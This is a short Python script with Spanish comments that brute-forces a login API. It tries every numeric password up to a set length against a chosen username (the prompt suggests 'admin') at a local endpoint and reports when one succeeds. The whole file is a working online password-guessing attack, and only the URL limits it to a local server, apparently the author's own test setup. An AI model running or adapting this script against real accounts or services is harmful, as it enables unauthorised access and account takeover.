import itertools
import string
import time
import requests
import sys  # Para argumentos de línea de comandos

# Configuración
API_URL = "http://localhost:8000/login"  # URL de tu endpoint de login
CHARS = "0123456789"  # Charset original
DELAY = 0.01  # Delay en segundos entre intentos (para no saturar la API local)

# Obtener username: desde argumento (sys.argv[1]) o input
if len(sys.argv) > 1:
    USERNAME = sys.argv[1]
else:
    USERNAME = input("Ingrese el username objetivo (ej. 'admin'): ").strip()

# Max length: desde argumento (sys.argv[2]) o default 8
if len(sys.argv) > 2:
    MAX_LENGTH = int(sys.argv[2])
else:
    MAX_LENGTH = 8

print(f"Iniciando ataque de fuerza bruta contra username: {USERNAME}")
print(f"Charset: {CHARS}")
print(f"Generando contraseñas de longitud 1 a {MAX_LENGTH}...")
start_time = time.time()
attempts = 0
found = False
password_found = None

for length in range(1, MAX_LENGTH + 1):  # Longitud de 1 a MAX_LENGTH
    if found:
        break
    print(f"Probando longitud {length}...")
    for guess in itertools.product(CHARS, repeat=length):
        if found:
            break
        attempt = ''.join(guess)
        attempts += 1
        
        # Preparar payload para POST /login
        payload = {
            "nombre_usuario": USERNAME,
            "contrasena": attempt
        }
        
        try:
            # Hacer request POST a la API
            response = requests.post(API_URL, json=payload)
            response_json = response.json()
            
            # Verificar si es login exitoso
            if "mensaje" in response_json and response_json["mensaje"] == "Login correcto":
                found = True
                password_found = attempt
                elapsed = time.time() - start_time
                print(f"¡CONTRASEÑA ENCONTRADA! '{password_found}' en {attempts} intentos. Tiempo: {elapsed:.2f}s")
                break  # Salir del loop interno
                
            # Delay para no saturar
            time.sleep(DELAY)
            
        except requests.exceptions.RequestException as e:
            print(f"Error en request (¿API no corriendo?): {e}")
            found = True  # Salir si error de conexión
            break

if not found:
    elapsed = time.time() - start_time
    print(f"No se encontró login hasta longitud {MAX_LENGTH}. Intentos: {attempts} | Tiempo: {elapsed:.2f}s")
